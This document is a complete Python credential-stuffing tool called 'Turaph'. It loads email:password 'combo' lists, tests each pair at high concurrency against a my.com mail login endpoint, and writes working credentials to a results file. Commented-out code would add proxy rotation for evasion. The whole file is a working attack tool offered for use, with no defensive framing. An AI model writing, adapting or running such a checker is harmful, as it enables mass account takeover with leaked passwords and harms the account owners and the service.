import aiohttp
import asyncio
import os
import ctypes
from datetime import datetime
from tasksio import TaskPool
from colorama import Fore, init

init(autoreset=True)
if os.name == "nt":
    os.system("mode con: cols=138 lines=30")


class Turaph:
    def __init__(self):
        self.valid = 0
        self.invalid = 0
        self.errors = 0
        self.totalchecked = 0

    def title(self, title):
        if os.name == "nt":
            ctypes.windll.kernel32.SetConsoleTitleW(f"Turaph | By Goldy | {title}")
        else:
            print(f"\33]0;Turaph | By Goldy | {title}\a", end="", flush=True)

    def logo(self):
        if os.name == "nt":
            os.system("cls")
        else:
            os.system("clear")

        print(
            f"""{Fore.LIGHTBLUE_EX}

                                            ████████╗██╗   ██╗██████╗  █████╗ ██████╗ ██╗  ██╗
                                            ╚══██╔══╝██║   ██║██╔══██╗██╔══██╗██╔══██╗██║  ██║
                                               ██║   ██║   ██║██████╔╝███████║██████╔╝███████║
                                               ██║   ██║   ██║██╔══██╗██╔══██║██╔═══╝ ██╔══██║
                                               ██║   ╚██████╔╝██║  ██║██║  ██║██║     ██║  ██║
                                               ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝
                                                  
{Fore.RESET}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n
        """
        )

    async def cpm(self):
        while True:
            if self.totalchecked != 0:
                self.title(
                    f"[{self.totalchecked}/{self.total}] CPM - {int(self.totalchecked / ((loop.time() - self.startedat) / 60))} | VALID - {self.valid} | INVALID - {self.invalid} | ERRORS - {self.errors}"
                )

            await asyncio.sleep(0.1)

    # def randomproxy(self):
    #     return random.choice(self.proxies)

    async def check(self, email, password):
        try:
            async with aiohttp.ClientSession() as client:
                retry = 0
                while retry < self.howmanyretries:
                    async with client.get(
                        f"https://aj-https.my.com/cgi-bin/auth?model=&simple=1&Login={email}&Password={password}"
                    ) as response:
                        status = await response.text()

                        if status == "Ok=1":
                            print(f"{Fore.LIGHTGREEN_EX}[Valid] {email}:{password}")

                            if not os.path.exists(f"results/{self.date}/"):
                                os.makedirs(f"results/{self.date}/")

                            with open(
                                f"results/{self.date}/valid.txt", "a", encoding="utf-8"
                            ) as file:
                                file.write(f"{email}:{password}\n")
                                file.close()

                            self.totalchecked += 1
                            self.valid += 1
                            break
                        elif status == "Ok=0":
                            self.totalchecked += 1
                            self.invalid += 1
                            break
                        else:
                            retry += 1
                            self.errors += 1
        except Exception:
            await self.check(email, password)

    async def start(self):
        self.title("Initialization")

        self.logo()
        combofile = open(
            input(
                f"{Fore.LIGHTYELLOW_EX}Enter combo file name (with .txt)\n{Fore.RESET}~# "
            ),
            encoding="utf-8",
        ).readlines()
        self.total = len(combofile)

        # self.logo()
        # useproxies = input(f"{Fore.LIGHTYELLOW_EX}Use Proxies? (y/n)\n{Fore.RESET}~# ").lower()
        # if useproxies == "y":
        #     self.proxies = open(input(f"{Fore.LIGHTYELLOW_EX}Enter proxies file name (with .txt)\n{Fore.RESET}~# "), encoding="utf-8").readlines()
        #     self.proxiestype = input(f"{Fore.LIGHTYELLOW_EX}Enter proxies type (http(s) / socks4 / socks5)\n{Fore.RESET}~# ").lower()
        #     self.proxiesformat = input(f"{Fore.LIGHTYELLOW_EX}Auth Proxies? (y/n)\n{Fore.RESET}~# ").lower()
        #     if self.proxiesformat == "y":
        #         self.proxiesformat = {}
        #     else:
        #         self.proxiesformat = {}

        self.logo()
        self.howmanyretries = int(
            input(
                f"{Fore.LIGHTYELLOW_EX}How many retries for each email?\n{Fore.RESET}~# "
            )
        )
        if self.howmanyretries < 1:
            self.howmanyretries = 1

        self.logo()
        howmanythreads = int(
            input(f"{Fore.LIGHTYELLOW_EX}How many threads?\n{Fore.RESET}~# ")
        )
        if howmanythreads < 2:
            howmanythreads = 2

        self.title("Starting")
        self.logo()

        self.startedat = loop.time()
        self.date = datetime.now().strftime("%d-%m-%Y %Hh%Mm%Ss")

        async with TaskPool(howmanythreads) as pool:
            await pool.put(self.cpm())
            for combo in combofile:
                combo = combo.rstrip()

                await pool.put(self.check(combo.split(":")[0], combo.split(":")[1]))

        self.title("Finished")

        self.logo()
        print(
            f"{Fore.LIGHTYELLOW_EX}Checking Finished! Results here: results/{self.date}/"
        )
        input()


if __name__ == "__main__":
    try:
        loop = asyncio.get_event_loop()
        loop.run_until_complete(Turaph().start())
        loop.close()
    except KeyboardInterrupt:
        exit()
